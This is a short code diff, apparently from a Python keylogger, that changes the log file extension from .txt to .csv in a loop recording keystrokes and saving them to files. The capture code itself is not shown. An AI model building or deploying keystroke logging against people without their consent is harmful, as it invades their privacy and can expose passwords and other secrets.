@@ -11,7 +11,7 @@ def main():
     while True:
         tempLog = functions.recording()     #recording keys... and save it in a variable
 
-        functions.writeToFile(logsPath,tempLogName+".txt",tempLog) #write into a new file the output 
+        functions.writeToFile(logsPath,tempLogName+".csv",tempLog) #write into a new file the output 
 
 #########################
 if __name__== "__main__":
